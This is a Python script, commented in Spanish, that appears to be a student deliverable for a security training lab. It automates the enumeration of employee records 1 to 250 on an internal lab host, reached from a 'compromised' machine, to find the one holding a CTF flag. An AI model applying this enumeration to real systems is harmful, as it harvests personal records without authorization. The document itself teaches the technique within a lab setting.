#!/usr/bin/env python3
"""
recolector.py — entregable del Lab 08 (automatización).

El R5 te pidió encontrar, entre 250 legajos, el que esconde el flag. Lo hiciste
con un `for` en bash. Ahora convertí eso en una HERRAMIENTA de verdad: un script
que enumera, filtra y reporta. Esto es el paso previo a un agente: vos definís la
LÓGICA; la máquina ejecuta la repetición.

Corré esto DENTRO del host comprometido (make shell-victima), porque el host
interno solo se alcanza desde ahí:

    python3 recolector.py --base http://phantomcorp-db --desde 1 --hasta 250

Solo biblioteca estándar (urllib). No agregues dependencias.
"""
import argparse
import json
import sys
import urllib.request
import urllib.error


def consultar_legajo(base: str, id_: int, timeout: float = 3.0) -> dict | None:
    """Consulta /empleado?id=<id_>; devuelve el objeto JSON o None si falla."""
    url = f"{base}/empleado?id={id_}"
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return json.loads(r.read().decode())
    except urllib.error.HTTPError:
        return None          # 404 = legajo inexistente
    except Exception as e:
        print(f"[!] error en id={id_}: {e}", file=sys.stderr)
        return None


def buscar_flag(base: str, desde: int, hasta: int) -> tuple[int, str] | None:
    """Busca el campo especial en el rango inclusivo y devuelve (id, valor)."""
    # El rango es inclusivo. No se conoce de antemano cuál legajo contiene
    # el dato especial: se identifica por su campo, no por un ID fijo.
    for id_ in range(desde, hasta + 1):
        legajo = consultar_legajo(base.rstrip("/"), id_)
        if legajo is None:
            continue

        for clave, valor in legajo.items():
            if clave not in {"id", "nombre", "area"} and isinstance(valor, str):
                return id_, valor

    return None


def main() -> int:
    ap = argparse.ArgumentParser(description="Recolector de legajos (Lab 08).")
    ap.add_argument("--base", default="http://phantomcorp-db")
    ap.add_argument("--desde", type=int, default=1)
    ap.add_argument("--hasta", type=int, default=250)
    args = ap.parse_args()

    print(f"[*] Enumerando legajos {args.desde}..{args.hasta} en {args.base}")
    hallazgo = buscar_flag(args.base, args.desde, args.hasta)
    if hallazgo:
        id_, flag = hallazgo
        print(f"[+] Flag en el legajo id={id_}: {flag}")
        return 0
    print("[-] No se encontró el flag en el rango dado.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
